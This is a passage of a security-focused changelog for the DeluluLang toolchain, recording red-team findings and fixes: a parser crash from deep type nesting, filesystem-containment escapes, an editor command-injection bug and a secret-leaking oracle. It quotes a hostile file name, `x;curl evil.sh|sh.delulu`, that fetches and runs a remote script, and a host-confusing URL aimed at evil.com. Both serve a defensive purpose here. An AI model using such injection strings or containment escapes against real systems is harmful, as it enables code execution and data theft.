  `revoking_an_adopted_node_cannot_be_undone_by_extending_the_chain` was **observed to fail** when the
  new refusal is neutralized.

- **Why the model did not catch it, recorded because it matters.** The `Custody.tla` model checks
  single-adoption and even reconstructs the certificate-replay bug when `SINGLE_ADOPTION` is turned
  off — but it abstracts a credential as a single opaque object with one identity, not a **chain of
  arbitrary length**. A property about chain *extension* cannot be stated over that abstraction, so
  bounded model checking could not have found this, exactly as the Z3 order model could not see the
  antichain collapse behind F1. This was found by adversarial execution against the implementation.
  The honest scope of the fix: it closes re-adoption within a broker lifetime; a broker **restart**
  still clears the in-memory tree and the retired-fingerprint set together (documented, deliberate —
  the grant tree does not persist), and revocation still cannot cross a partition (that bound is the
  uplink lease, unchanged).

## Unreleased — P20 zero-trust red team, 2026-08-08

### Language — CHANGED (narrows what compiles): type nesting is capped at 128 levels (DL0211)

- **A deeply nested type was a denial-of-service surface, and at greater depth a hard crash**
  (red-team finding P20-R3). `DL0210` caps *expression* nesting; nothing bounded a *type*. A
  signature `fn f(x: List[List[…List[Int]…]])` nested ~16,000 deep **checked clean in ~59 seconds**,
  the curve quadratic-to-cubic in depth (12k→20s, 14k→37s, 16k→59s, 18k+→hang), so a ~96 KB file made
  `delulu check` — the loop an agent runs on every edit — unresponsive for a minute. The cost is in
  the checker's type lowering, so the fix bounds depth **at parse time**, before that pass is
  reached: a new `MAX_TYPE_DEPTH = 128` guard in `parse_type` refuses deeper types with **`DL0211`**.
  Now the 16,000-deep type is refused in **2 seconds**; a 10-deep type still checks clean.

  **Falsification turned up a second, worse failure that the quadratic measurement had hidden.**
  Raising the limit to expose the test showed the parser **stack-overflowing** (`STATUS_STACK_OVERFLOW
  0xC00000FD`) on a deep-enough type — the 59-second case was merely the slow part visible on the
  CLI's explicit 512 MiB stack; a 2 MiB tooling or LSP thread crashes outright. The 128 cap closes
  both the DoS and the crash, and holds on the smallest stack, exactly as `MAX_EXPR_DEPTH` does.

  **This narrows the accepted language** — a type nested past 128 levels used to compile — which is
  why it carries a diagnostic and is recorded rather than treated as a silent fix. No hand-written or
  generated program nests a type past a handful of levels; one that needs more should name an inner
  type with a `type` alias. Witnessed by `reject/DL0211_deep_type.delulu` (conformance) and two
  falsified parser tests (the limit refuses, a 32-deep control still parses). The core-invariance
  snapshot moved **only additively** — the new witness's own output, zero existing bytes changed —
  which is the proof the language did not move for any program that already compiled. Also corrected
  while here: `DL0210`'s explain text said the cap was "1,024 levels"; it has been 128 since P17-F5.



### Security — DOCUMENTED BOUNDARY (red-team finding P20-R1): hardlinks escape fs containment

- **A hardlink planted inside a granted directory reads and writes the file it shares content with,
  even when that content also lives outside the grant.** Observed end-to-end against the real binary:
  a grant of `fs.read=./data` read a hardlink `data/hl.txt` sharing content with `secret/flag.txt`
  (and `fs.write` clobbered it), while `../secret/…`, a **junction** (the C84 vector), an absolute
  path, a `\\?\` verbatim path, an alternate-data-stream path and an 8.3 short name were all refused
  `DL0904`. Documented, not fixed, for reasons each **measured rather than argued**: a hardlink is a
  second name for one file (not a redirection `canonicalize` can resolve, which is what C84 relies
  on), so the file genuinely resides in the grant; it is **not deliverable through a clone** (git
  stores a blob, the clone has a plain file with no link — tested); it needs an attacker who can
  already open the target; and no cheap cross-platform defense exists (POSIX cannot enumerate an
  inode's names without walking the filesystem, so a fix would make containment platform-dependent).
  Pinned as an executed characterization + C84-regression test in
  the `containment_tests` module in `crates/delulu-runtime/src/prim.rs`; full threat model in `HARDENING_CAMPAIGN.md`
  P20-R1, and the boundary is named in `docs/QUESTIONS.md` §1.7.

### Security — VERIFIED HELD: adversarial multi-agent authority test

- **Four AI agents (2× Sonnet 5, 2× Haiku 4.5) were run as adversarial DeluluLang programmers**, each
  given a constraint the principal imposed and a mandate to exceed it; their programs were then run
  under exactly the granted authority. Verified by execution: every effect-row-laundering attempt was
  refused at compile time (six `DL0501`, and one `DL0401` — the C88 "refuse rather than assume purity"
  guard firing against a fresh higher-order attack); the IF-1 map+verify secret oracle and a
  `verify()`-hiding helper were both forced to declare `Declassify` (`DL0501`), with the honest
  version reporting `exposure: … declassifiable` in `delulu authority`. Zero ambient authority held
  throughout (every ungranted capability was `DL0703`). Recorded in `HARDENING_CAMPAIGN.md` P20.

## Unreleased — P19 ecosystem campaign, 2026-08-07 (editor surface)

### Editor — FIXED: the language server never started (regression from P18)

- **The VS Code extension shipped with a language server that could not start.** `extension.js`
  registered `delulu.authority`, which a language client *also* registers on the server's behalf for
  every entry in `executeCommandProvider.commands`. `registerCommand` threw
  *"command 'delulu.authority' already exists"* from inside `client.start()`, so initialization
  failed, the queued `didOpen` was dropped, and the server was shut down — leaving syntax
  highlighting and nothing else, in every workspace. The lens now names `delulu.showAuthority` (the
  editor's command), distinct from `delulu.authority` (the server's protocol command).

  The whole suite was green throughout. `lsp_cli.rs` starts the server and speaks LSP to it, but is
  not a VS Code client and so never runs the client library's feature registration; `editor_contract.rs`
  compared command lists as source text, and reading two files cannot say what a third-party library
  does at runtime. Worse, that test asserted the *opposite* of the correct rule — it scraped the
  server's `execute_command` dispatch as though those were lens commands and required the client to
  register them — so it did not merely miss the bug, it demanded it. Both halves are fixed, and
  `editors/vscode/e2e.js` now launches a real VS Code against a real server.

### Editor — NEW: Format Document works

- **The language server now implements `textDocument/formatting`.** `delulu fmt` has a canonical
  style, a law suite and a 100k-program gate behind it, and no editor could reach any of it: the
  server never advertised `documentFormattingProvider`, so *Format Document* was greyed out and
  `editor.formatOnSave` did nothing on `.delulu` files. It is the same `format_source` the CLI calls,
  and a test requires the two to produce byte-identical output — two formatters that drift are worse
  than one, because saving in the editor and running `delulu fmt --check` in CI would then disagree.
  An already-canonical file returns **no** edits (an edit that replaces text with itself still dirties
  the buffer), and an unparseable file returns no edits rather than an error, because format-on-save
  fires exactly when the file is mid-edit and broken. Range formatting is deliberately **not**
  advertised: the formatter's contract is over a complete parse.

### Editor — NEW: the atlas, snippets, tasks, a problem matcher and a status bar

- **Authority atlas in a panel.** *DeluluLang: Show authority atlas* renders `delulu atlas --format
  html` beside the file — the call graph with each function's effect row on it. The generated
  document is self-contained (nothing fetched from anywhere), which is what makes it displayable at
  all; the webview is nonetheless created with scripting **disabled** and a `Content-Security-Policy`
  permitting only inline styles, because "our own binary produced it" is an argument that stops
  holding the moment someone adds a feature to that binary.
- **Snippets that carry the effect row.** A snippet emitting `fn f() { … }` without the row would
  teach people to write the declaration and discover the checker's objection afterwards.
- **Tasks** for check/build/test/fmt through `ProcessExecution` — an argument vector, never a shell —
  one per workspace folder so a multi-root workspace does not silently pick one. `fmt` is bound to
  `--check`, because a task that rewrites files when you press the build key is a surprise.
- **A `$delulu` problem matcher**, so terminal output becomes clickable Problems entries. It depends
  on every error line beginning `error:`, which is why that convention is now a test.
- **A status bar item**, so a language server that failed to start is visible rather than quiet.

### CLI — a mistyped command now says what you meant

- **`delulu chekc` answers "did you mean `check`?"** instead of printing the name and then a hundred
  lines of usage — which answers *what happened* and buries *how to fix it* under everything the tool
  can do. The edit-distance budget scales with the length of what was typed, and the function
  **declines to guess** when nothing is close: `delulu package` (a real word for a command that does
  not exist) gets no suggestion, because a confident wrong suggestion is followed.
- **`delulu help <cmd>` now shows that command's help.** It ignored its argument and printed the full
  usage, which made the suggestion above point at something that did not work.

### Verification — Miri was aimed at the wrong crates

- **`delulu-runtime`'s raw-pointer decoding now runs under Miri** (`miri-ffi` job). Counting `unsafe`
  in first-party sources: `delulu` 37, `delulu-runtime` 13, `delulu-diag` 2 — and **zero** in
  `delulu-atlas`, `delulu-broker`, `delulu-syntax` and `delulu-check`. Miri was running on four
  crates containing no `unsafe` at all and skipping the two holding 50 of the 54 sites, so "0 UB" was
  true and much weaker than it sounded. `validate_c_string` — a hand-rolled NUL scan with `ptr.add`
  and `from_raw_parts` — is a pure function over caller-supplied memory and needs no FFI to exercise;
  it already had tests, and nothing had ever interpreted them. They take 2.4 seconds. The detector
  was confirmed live rather than assumed: a probe reading past a 4-byte allocation was caught as
  *"at or beyond the end of the allocation of size 4 bytes"*. The FFI calls themselves stay out of
  reach — Miri cannot execute `dlopen` or Windows API calls — and that is recorded as an explicit
  assumption, not a to-do.

### Editor — FIXED: a workspace could choose which binary the extension launched

- **`delulu.serverPath` is now `machine-overridable`.** At VS Code's default scope a repository's own
  `.vscode/settings.json` could set it, and the extension launches that path as a process the moment
  a `.delulu` file is opened — so opening a cloned repository ran a binary the repository chose, with
  no click from the user. Reproduced end-to-end in an isolated VS Code profile with trust granted (so
  that trust was not what refused): the unfixed build ran a planted executable 7 seconds after the
  folder opened, the fixed build never ran it, and nothing differed between the two packages but the
  `scope` line. `editor_contract.rs` now fails the build for any setting naming a path, binary, or
  argument list that a workspace could write.
- **The extension resolves the server to an absolute path itself.** A bare name handed to `spawn` is
  resolved by the OS, and on Windows `CreateProcess` searches the current directory before `PATH`. A
  planted `delulu.exe` was *not* executed on VS Code today, but that is the host's choice of working
  directory rather than a guarantee this extension made; the `PATH` walk now happens in
  `server-resolve.js`, under test.
- **`delulu run` and `delulu test` refuse in an untrusted workspace**, since they execute the
  workspace's own code; analysis still runs, because reading a hostile file is what a server is for.
- **A missing server now explains itself** — which binary, how many `PATH` entries were searched, and
  the two ways to fix it — with a status-bar item carrying the same state, replacing the language
  client's bare *"couldn't create connection to server"*.
- **New:** `delulu.trace.server` (`off`/`messages`/`verbose`) logs protocol traffic to the DeluluLang
  output channel.
- **`verify-package.js` no longer reports prefix-only builtins as missing packages.**
  `builtinModules` does not list `node:test`, so a shipped file requiring it was called an
  unresolvable dependency; the `node:` scheme is reserved for builtins, so the prefix is now what is
  checked. Test files no longer ship in the `.vsix` either.

## Unreleased — P17 proof campaign, 2026-08-03 (findings IF-1, F1–F5)

Findings live in `docs/design/PROOF_CAMPAIGN.md`. This campaign attacks the project's **claims**
rather than its implementation, so most entries below are *open findings*, not fixes. Nothing here
changes released behaviour **except P17-F5**, which narrows the accepted language — see below.

### Authority — FIXED, and format-affecting (F1, F2, F3)

- **Path scopes are now stored in canonical form.** `⊑` is defined through `path::resolve`, which is
  not injective — `./data`, `data`, `./data/` and `.\data` are one path under four names. A relation
  defined through a non-injective function is a **preorder**, never a partial order, so the module's
  own word "lattice" was wrong about the carrier, and three findings followed from the one cause:
  the order was not antisymmetric (**F1**), `⊓` was not symmetric because the surviving spelling was
  whichever argument came first (**F2**), and one logical grant hashed two ways in the audit chain
  (**F3**). All three are closed by canonicalizing at the custody boundary — `Broker::issue`,
  `attenuate`, and `attenuate_core`. The three `#[ignore]`d, deliberately-failing tests in
  `order_laws.rs` are now **un-ignored and passing**.

  **The canonical form is an ANTICHAIN, not merely a normalized spelling**, and the earlier analysis
  did not predict that. `{"./data", "./data/sub"}` and `{"./data"}` are also mutually `⊑` while
  differing as sets, because `./data/sub` is already inside `./data`. Normalizing spellings alone
  leaves the order a preorder; the redundant elements have to go too. The Z3 model could not have
  seen this — it abstracts a dimension as a set over an opaque element type, so it cannot express
  one element subsuming another. The counterexample came from the exhaustive enumerator.

  **This changes bytes.** An authority written before this change using a non-canonical spelling
  hashes differently from the same authority written after it. Existing records still verify (the
  chain recomputes from stored bytes), but a pre-change and a post-change broker would compute two
  hashes for one logical grant during federation reconciliation. `PROOF_CAMPAIGN.md` records that
  this is the format-affecting change the campaign had earlier declined to make without an RFC, and
  that it was made by owner instruction rather than through the RFC process.

  Canonicalization changes spelling, never meaning: `resolve(canonicalize(p)) == resolve(p)` over an
  adversarial corpus, and no containment decision changes. One trap needed designing around — a
  relative component that looks like a drive letter (`./C:`) must keep its `./` prefix, or it would
  re-resolve as the whole of drive `C:`, which is a widening.

### Verification — evidence that did not exist before

- **Miri completes for the first time: 192 tests, three crates, zero undefined behaviour.** It had
  been started twice previously and finished neither time. `delulu-diag` 45 passed, **`delulu-broker`
  129 passed**, `delulu-atlas` 18 passed. It must be run **per crate** and with
  `-Zmiri-disable-isolation` — without the flag Miri aborts on `create_dir_all` as an *unsupported
  operation*, which an earlier pass had recorded as a failure when it is a Miri limitation. The limit
  stands: the crates Miri can run contain no `unsafe`, and the three that do are the ones it cannot.
- **Both deliberately-`#[ignore]`d slow gates were actually run**: the WASM two-engine differential
  over 50,000 programs (683 s, 0 divergences) and the formatter's 100,000-program law gate (853 s).
- **Random authority graphs at 10 / 50 / 100 / 250 / 500 / 1000 agents**, plus 20 independent
  topologies (`multi_agent_stress.rs`), checking attenuation-to-root, inherited revocation,
  inherited expiry, and canonical storage over shapes nobody drew by hand.
- **macOS cross-checking widened, and an earlier reading corrected.** Seven crates now type-check
  clean for `x86_64-apple-darwin`, and Apple Silicon is *not* wholly uncheckable from this host —
  three crates compile clean for `aarch64-apple-darwin`. **Still zero macOS executions.**
- **CI gained Miri, ARM64 Linux, clippy/rustfmt gates, and an extension build+verify job.** It has
  still **never executed**, because the repository is not pushed.

### Documentation — a false claim corrected

- **`README.md` said "no proof assistant is installed".** It has been false since the P17 campaign
  installed Lean and machine-checked the higher-order fragment. Re-verified rather than assumed:
  Lean 4.32.2 checks `DeluluCore.lean` in 37 s and `#print axioms` reports all three theorems
  *"does not depend on any axioms"*. The genuine limit — the **full** type system is not mechanized —
  is stated instead of the wrong one.

### Editor — FIXED (VS Code extension, first test that read server and client together)

- **Command injection through the open file's path.** The run and test code lenses built a shell
  command *string* — `` `${serverPath} run ${fsPath}` `` — and sent it to the user's shell. A file
  named `x;curl evil.sh|sh.delulu` executed on click, and **any path containing a space already ran
  the wrong command**. Paths come from editor tabs, so they are attacker-influenced the moment a
  project is opened from a clone. Commands now execute with an argument vector, which no shell parses.
- **The `authority: {…}` lens never worked.** The server has emitted it since Stage 8; no client
  ever registered the command, so clicking it raised *"command 'delulu.authority' not found"*.
- **"▶ run test" ran every test in the file.** The server sends `[uri, testName]`; the client
  dropped the name.
- **The packaged `.vsix` would not have activated.** `npm install` placed 8 packages in
  `node_modules`; `vsce` shipped only the one named in `dependencies`, so three transitive requires
  were absent and activation would have thrown `Cannot find module`. The extension is now bundled
  with esbuild into a single file, which removes runtime module resolution rather than re-tuning it.
- **The extension claimed the wrong licence and version** — `MIT` at `0.8.0` beside an Apache-2.0
  workspace at 1.0.0.

  `crates/delulu/tests/editor_contract.rs` now fails the build if the commands the server emits, the
  commands the client registers, and the commands the manifest declares ever disagree, if a path is
  interpolated into a shell string again, or if the manifest drifts from the workspace. Each of its
  gates was checked by reintroducing the exact defect and watching it fail.

### Language — CHANGED (narrows what compiles)

- **`DL0210`: expression nesting is now capped at 128 levels.** Previously the parser recursed
  without bound and a *valid* module nested 100,000 deep did not produce an error — it overflowed
  the stack and killed the process (exit 127), with no diagnostic code, no span, and nothing a
  caller could catch. `delulu check` is the gate every other guarantee is verified through, and a
  gate that can be made to die instead of answering can be skipped (finding **P17-F5**).

  Two separate unbounded recursions had to be closed. The descent guard alone did not stop the
  crash: the **iterative** postfix loop went on building a 100,000-deep `Box` chain that `Drop`
  then unwound recursively. Both are bounded now.

  The limit is measured against a **2 MiB** thread stack — the ordinary default that libtest and
  tooling threads get — not against `delulu-main`'s explicit 512 MiB. Two earlier values (1,024 and
  256) crashed the test binary outright and were rejected on evidence.

  **This narrows the accepted language**: expressions nested past 128 levels used to compile and now
  produce `DL0210`. No hand-written program approaches that depth; generated code that needs more
  should emit a `let` per level. `DL0210` was the code Stage 1 held reserved for the next parse
  diagnostic, so nothing was renumbered.

### Security — FIXED

- **CRITICAL (IF-1): a secret was fully recoverable while the toolchain said it could not be.**
  `delulu why Declassify` reported "program cannot perform `Declassify`" for a program that printed
  an entire API key. `Secret.map` hands its closure the **plaintext** and gates only on purity
  (DL0603); `Secret.verify` returned the result as an **untainted `Bool`**; `if` carries no
  pc-label. Composed, they are an equality oracle against an attacker-chosen string
  (`k.verify(k.map(fn(x) { g }))`), iterable to full plaintext recovery — with no `Cap[Declassify]`
  anywhere and `--assert-trace` exiting 0. **Reopened R-2 and R-5 simultaneously.** Neither
  operation is defective alone, which is why a rule-by-rule audit could not see it.

  **Fix (closing rule R-2b): `Secret.verify` now carries `Effect::Declassify`** in both halves of
  the primitive table — `check.rs::method_sig` and `trace::effect_for` — which must agree or
  `--assert-trace` would report a runtime effect absent from the row. Both oracles are now DL0501.
  This is R-2 applied where it always belonged: `verify` returns a value *derived from secret data*,
  which is a declassification. Typing it pure was an error, not a trade-off — and it had been
  **pinned as a passing test** (`effect_for_is_none_for_pure_operations` asserted `verify` was pure
  under a comment calling it so).

  **The fix buys visibility, not impossibility, and says so.** A program declaring `!{Declassify}`
  may still run the oracle; `delulu authority` then reports `effects: Declassify` and
  `exposure: … declassifiable -> files/console`. That is what R-2 promises.

  **Residue, open:** `verify` declassifies without requiring `Cap[Declassify]` where `expose`
  requires it. Closing it means `verify` returning `Secret[Bool]`, which the runtime cannot
  represent (`SecretVal` is String-only) — an RFC, not a patch.

  **Behaviour change:** a function calling `Secret.verify` must now declare `!{Declassify}`. Four
  in-repo programs were updated; the core-invariance snapshot moved in 7 cases, each inspected
  before re-recording. Witness: `crates/delulu-check/tests/secret_oracle.rs`.

### Known — found, named, and NOT fixed

- **`⊑` is a preorder, not a partial order (F1).** `./data` and `data` resolve to the same path but
  `Authority` derives `PartialEq` structurally, so they attenuate each other while comparing
  unequal. 206 witnesses. "Lattice" is imprecise; the structure is a preorder whose poset reflection
  is a meet-semilattice.
- **`⊓` is not symmetric (F2).** `authority.rs:145` states it is. `A⊓B = {./data}` where
  `B⊓A = {data}`: `intersect_path_sets` tests `if desc(x,y) … else if desc(y,x)`, so when both hold
  the first argument's spelling wins. 414 witnesses.
- **`⊑`-equivalent authorities hash differently (F3).** That spelling reaches `to_json`, the
  canonical form inside hash-chained audit records and under certificate signatures, so one logical
  grant hashes two ways. Endangers federation audit reconciliation. Fix is format-affecting (it
  would change the bytes of existing records) and belongs in an RFC.
- **Row inference is order-dependent and has no principal types (F4).** Swapping two parameters
  decides whether a program compiles: `e := {Read}` satisfies both constraints, but unification
  binds `e := {}` greedily from the first parameter and never backtracks. R-3b is **not** at fault —
  refusing to union-merge is correct; the greedy choice upstream manufactures the conflict R-3b then
  correctly reports. Fail-closed, so no authority escapes, but currently undocumented.

**Not** an escalation: F1–F3 are naming, determinism and serialization defects. The meet was
verified exhaustively to be a genuine **greatest** lower bound that never widens, and the order's
reflexivity and transitivity were additionally proved in Z3 over an abstract partial order.

### Security — FIXED (P17, 2026-08-04)

- **wasmtime 27 → 47 — nineteen advisories to none.** `cargo deny` now reports
  `advisories ok, bans ok, licenses ok, sources ok`. The one that mattered was **RUSTSEC-2026-0096**,
  a miscompile in the aarch64 Cranelift backend enabling a **sandbox escape** — never executed here,
  but this project ships **source**, so every Apple Silicon or ARM-server build was exposed. Cost:
  three lines (wasmtime 47 stopped re-exporting `anyhow::Error`). **Half of that only failed on
  Linux** — the affected call sites live in `#[cfg(not(windows))]` code Windows never compiles, so a
  single-platform check would have shipped a build that does not compile where most users build.
- **The audit chain now detects TRUNCATION.** Every check `verify` performed was local to a link, so
  deleting the last *k* records left a chain that still verified, and nothing anchored the head.
  `ANCHOR.json` now records head and count outside the log; `verify` compares, and `AuditLog::open`
  refuses a log that disagrees with its own anchor. **Not tamper-proof and does not claim to be:** an
  attacker who rewrites both is not caught — pinned as a passing test. What is closed is accidental
  truncation (partial write, full disk, botched rotation) and naive tampering, and the head is now
  exportable so an external witness becomes possible.
- **Expiry can no longer be undone by a backwards clock.** `Broker::now` ratchets to the running
  maximum of every reading. `Instant` was unavailable — certificate `not_before`/`not_after` are
  signed absolute epoch-millis — so the reading stays wall-clock-comparable and is merely made
  non-decreasing. It can only **withhold** authority, never grant it, and that direction is a test.
  Routine backwards steps on the target platforms (GNSS acquisition, NTP correction, RTC at
  power-on) no longer resurrect expired grants.

### Known — capability-algebra and theorem-sketch findings (P17-7), OBSERVED and NOT fixed

- 🔴 **The core calculus does not model the construct that broke.** `DELULU_CORE.md` §9 names a
  Lean/Coq formalization of §1–§7 as the mechanization target; **mechanizing it as written would not
  have caught C88.** The document contains **zero** occurrences of `higher-order`, `callback`,
  `invoke` or `map`: `Σ` gives each primitive a single emitted label, `E-Op` reduces in one step, and
  `T-Op` unions only the rows of *evaluating* the arguments — which for a lambda is `{}`, since
  closure construction is pure. A callback's **latent** row never enters. Theorem 3 is therefore
  provable and true *of the calculus* while the implementation was unsound. **Phase 9's target has
  changed:** the calculus must first be extended with a higher-order primitive form. Recorded in a
  box at the top of `DELULU_CORE.md` §9 so nobody starts the proof without reading it.
- 🔶 **Theorem 1 (Progress) is false as stated.** `E-Op` carries "(scope of κ permits the arguments)"
  as a premise, so a present, well-typed capability whose *scope* does not cover the argument leaves
  the term **stuck** — which Progress forbids. Observed: a program granted `fs.read=./data` reading
  `../outside.txt` checks clean, then faults with `DL0904`. The calculus has no fault configuration.
  The sketch's justification only covers a *missing* capability. Correct statement: progress-or-fault.
- 🔶 **Expiry is judged against a wall clock, so backwards time resurrects authority.** `time.rs`
  uses `SystemTime::now()`; observed in `crates/delulu-broker/tests/clock_monotonicity.rs` that a
  grant which reported `Expired` reports `Live` again after the clock steps back — no revocation, no
  audit event, nothing recording that authority returned. A control confirms expiry is permanent
  under forward-only time. **This matters for the stated users specifically:** on satellites,
  aircraft and robots a backwards step is routine (GNSS acquisition, NTP correction, RTC at
  power-on), and the uplink lease — the bound designed to survive a partition — is a wall-clock
  deadline. The guarantee rests on clock monotonicity, an assumption the design never states.
- ✅ **No deserialization escalation vector exists** — the grant tree is never written to disk, so no
  file can be edited to give a child more authority than its parent. Every node in a running broker
  came through `attenuate_core` and its `⊑` check. Consequence worth knowing: a daemon restart drops
  every grant (fail-closed; authority is re-established by adopting a signed certificate).

### Known — cryptography audit findings (P17-7), OBSERVED and NOT fixed

- **The audit chain does not detect truncation.** `verify` checks each record's `prev_hash` and
  recomputes its hash, but every check is *local to a link* — so deleting the last *k* records
  leaves a chain that still verifies, with a shorter count and an earlier head. Nothing anchors the
  head: `AuditLog::open` **recovers** it from the files themselves, so the broker resumes chaining
  from the truncated head and every later record is genuinely valid. Observed with a control (an
  in-place edit *is* caught) in `crates/delulu-broker/tests/audit_truncation.rs`. Bounded by the
  threat model — the audit directory is under the operator's own account — but **the honest claim is
  "detects modification and reordering", not "tamper-evident"**, because the attack it misses is the
  attractive one: deleting the record of what you did rather than altering it. Closing it means
  anchoring the head outside the log — a persistence-format change, so an RFC.
- **The `device` dimension has two sources of truth.** `Scopes::device` is a
  `BTreeMap<String, DeviceScope>` whose value carries its own `device` field; **authorization reads
  the map key** (`all_within`, `grants_device`, the meet) while **the signed and audited bytes read
  the value's field** (`to_json`, `render_compact`). Nothing enforces that they agree. Observed in
  `crates/delulu-broker/tests/device_identity.rs`. **Not exploitable from outside the process** —
  `cert::authority_from_json` re-keys on the field, so every certificate load repairs it — but it is
  a latent divergence of exactly the shape design rule 1 warns about, and a third test pins the
  re-keying so the day it stops holding is the day this becomes reachable.
- **What is well done, recorded because an audit that only lists faults is not an audit:** domain
  separation is present, deliberate and tested (`delulu-grant-v1` vs `delulu-receipt-v1`, with tests
  that a receipt signature cannot be replayed as a grant); canonical JSON sorts keys recursively; and
  omit-when-empty is injective, so it introduces no signature collision.

### Security — supply chain and engine hardening (P17-F)

- **There was no supply-chain gate at all.** `cargo deny` had never been run; there was no
  `deny.toml`, and nothing in CI, the suite, or any script checked the tree against RustSec. The
  first run reported **19 vulnerabilities and 2 unmaintained crates**. The CVEs were the symptom —
  the absent gate was the defect. `deny.toml` now runs advisories/bans/licenses/sources, with a
  falsifiable reason on every ignore, and the **4 reachable advisories deliberately NOT ignored**,
  so `advisories` is red on purpose. Reachability triage: 14 of 19 cannot reach this project
  (Winch, component model, WASI, pooling allocator — none used); the reachable ones are an aarch64
  Cranelift sandbox escape (this project has never run on ARM but ships source), a
  mix-type-indices-between-engines issue, and two pyo3 CVEs that are live in a **default** build.
- **Fixed:** RUSTSEC-2026-0204 (crossbeam-epoch invalid pointer dereference) — 0.9.18 → 0.9.20,
  semver-compatible.
- **The WASM engine accepted features the compiler never emits.** `Config::new()` left SIMD,
  threads, memory64 and the component model at wasmtime's defaults, so the engine would validate a
  module using them — and it also runs `.dwx` plugin artifacts, which arrive as bytes. The file
  already argued that `cranelift_opt_level` should be pinned explicitly "so it cannot silently
  change"; the same argument now applies to the feature set. `harden_wasm_features` disables all
  four on both the Stage-3 engine and the plugin store, with a test that proves the narrowing takes
  effect — asserting a control first, that a stock engine *accepts* the same module.
- **Secret zeroization could be optimized away.** `SecretVal::drop` used a plain `*b = 0` loop; a
  non-volatile store to memory that is never read again is a dead store and the allocation is freed
  immediately after, so LLVM may delete the whole loop. Now `write_volatile` + `compiler_fence`,
  using `std` alone. Limit stated: it zeroes the current allocation only — not an earlier buffer
  left by a `String` realloc, nor a copy made by `reveal`.

### Added

- **`scripts/cli-sweep.sh`** — the CLI + compiler sweep as a reproducible script (22 cases, exact
  exit codes). It had been performed by hand every pass, which is exactly the drift design rule 1
  warns about. **Windows 22/22, Linux 22/22.**
- **`docs/design/models/Custody.tla` — leases and certificate adoption are now MODEL-CHECKED**, which
  is where **both** of this project's real vulnerabilities lived. Models `lease.rs` (delegate → mint
  → redeem, single-use nonces, key rotation) and `cert.rs` (adoption, single-adoption per broker
  lifetime, uplink deadlines). Clean run: 2,421 distinct states, depth 9. **Two teeth tests, not
  one:** turning off `SINGLE_ADOPTION` makes TLC reconstruct the **certificate-replay** defect at
  depth 4 (one credential adopted twice, so revoking one node leaves another live with the same
  authority); turning off `LIVE_ON_REDEEM` makes it reconstruct **campaign finding C29** at depth 5
  (a token redeemed successfully against a revoked grant, writing `decision: "allow"` into the audit
  chain). Neither defect was described to the model — both were reconstructed from the guards.
  Not modelled: the MAC itself, audit hashing, contact receipts, and concurrency/partitions/clock
  skew — the last matters, because the uplink lease exists to bound behaviour during a partition.
- **`docs/design/models/Broker.tla` — the custody grant tree is now MODEL-CHECKED.** TLA+/TLC v1.7.4
  explores **585,771 distinct states** of grant / delegate / revoke / expire and finds no violation
  of attenuation, revoke-covers-subtree, no-resurrection, inherited expiry, or audit
  append-onlyness. Every action's guard cites the `tree.rs` line it mirrors and takes the **weaker**
  guard where the code is ambiguous, so the model can never be kinder than the implementation.
  **The model is shown to have teeth rather than asserted to:** re-run with the enforcement read
  switched back to per-node expiry (the pre-RFC-0001-F4 behaviour), TLC reconstructs the **real
  historical bug** at depth 4 — a `ttl: None` child outliving its parent's expired uplink lease.
  Bounded (3 nodes, 2 effects, clock ≤ 2); leases, certificate adoption, concurrency and federation
  are **not** modelled, and that is exactly where both known vulnerabilities were found.
- **`crates/delulu-fuzz/src/danger.rs` — the fuzzer can now write the bugs it hunts.** The Stage-2
  generator emitted four templates with no type parameters, no closures, no higher-order builtins,
  no `Secret` operations beyond `str(s)` and no control flow — so it **could not have found C88 or
  IF-1**, whatever its iteration count. The grammar is the coverage. Added parameterised families
  over the shapes that have actually broken the language, including both C88 twins (`List.map` and
  `Secret.map`), with two tests asserting the generator really emits them.
- `docs/design/PROOF_CAMPAIGN.md` — the proof-boundary ledger: every guarantee assigned to exactly
  one of seven categories (proven / machine-checked / model-checked / property-tested /
  differentially verified / fuzz verified / outside the boundary), with no grey area permitted.
- `crates/delulu-broker/tests/order_laws.rs` — the first **exhaustive-enumeration** test in the
  repository. It replaces a hand-picked pair (commented "Property spot-check") with every subset of
  a path universe. All three laws it disproves already had passing hand-written tests.
- `crates/delulu-check/tests/secret_oracle.rs` — the IF-1 witness, with three controls that must keep
  passing so no future fix can be a blanket refusal.
- Verification toolchain, each smoke-tested before use: **Z3** 5.0.0, **TLA+/TLC** v1.7.4,
  cargo-fuzz, cargo-deny, Miri. **No Lean/Coq/Alloy** — so *machine-checked* remains unreachable and
  `DELULU_CORE.md` §9's promised mechanization is still open.

### Fixed — P16 adversarial pass, 2026-08-03 (rulings D78–D88)

- **The effect row could be escaped entirely (C88/D78).** A callback reaching a higher-order builtin
  through a bare type parameter had its effect row **silently dropped**, and a dropped row is an
  empty row. Nine ordinary lines produced a program that `check` called clean, that `authority`
  reported as `effects: (none — provably pure)`, that `why Write` said "cannot perform `Write`" —
  and that performed I/O at run time. The same branch on `Secret.map` leaked a **plaintext secret**
  with no `Declassify` effect anywhere, reopening R-2 as well as R-4. The checker now **refuses**
  what it cannot determine (DL0401) rather than assuming purity. Zero false positives across the
  conformance corpus. This is the most serious defect the campaign has found; see
  `SOUNDNESS_AUDIT.md` for why an audit of the *rules* could not have caught it.
- **Filesystem scope was purely lexical, so a symlink or Windows junction escaped it (C84/D79).**
  A grant of `./data` refused `../secret/x` and **allowed** `link/x` where `link` pointed outside —
  for write as well as read, in both custody modes, and with the audit chain recording the
  in-scope path for a write that landed outside it. `STAGE3_SPECIFICATION.md` §4.3 had always stated
  symlink resolution as normative host-side law; the rule was written and the code was missing. Both
  doors are closed — the per-operation check and minting a capability rooted at the link — through
  one shared, fail-closed `contains_on_disk`, used by the interpreter and the WASM engine alike.
- **The `net` wildcard had no dot boundary (C85/D80).** `*.example.com` matched `evilexample.com`, a
  different registrable domain. The project's sibling Python-import matcher already required the
  separator. Fixed; a real subdomain is still allowed.
- **URL userinfo confused host extraction (C86/D80).** `https://example.com:8080@evil.com/` was read
  as `example.com`, so a grant of `example.com` authorized — and the audit chain recorded — the wrong
  host. Nothing was exfiltrated (v1.x ships no HTTP client); the *decision* and the *record* were
  wrong. The duplicate copy of the parse in `interp.rs` now delegates to one function.
- **An empty grant value granted the whole working directory (C87/D81).** `--grant fs.read=` — the
  shape an unset shell variable produces — joined `""` onto the CWD. Five of eight grant keys already
  refused it; now all eight do.
- **`morph render` silently rewrote identifiers into keywords (C82/D82).** A valid program using `T`
  and `E` as names, rendered through the shipped `compact-ai` morph and back, returned as
